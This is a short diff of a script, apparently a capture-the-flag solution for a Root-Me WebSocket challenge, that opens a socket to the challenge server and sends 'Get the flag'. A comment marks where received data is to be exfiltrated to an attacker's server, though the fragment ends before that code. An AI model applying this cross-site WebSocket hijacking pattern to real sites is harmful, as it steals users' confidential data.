@@ -11,7 +11,8 @@
 <script>
 	websocket = new WebSocket('ws://challenge01.root-me.org:58036/ws')
 	websocket.onopen = function () {
-	  websocket.send("hello");
+	  websocket.send("Hello");
+	  websocket.send("Get the flag");
 	}
 	websocket.onmessage = function (event) {
 	  //Exfiltrate the confidential information to attackers server
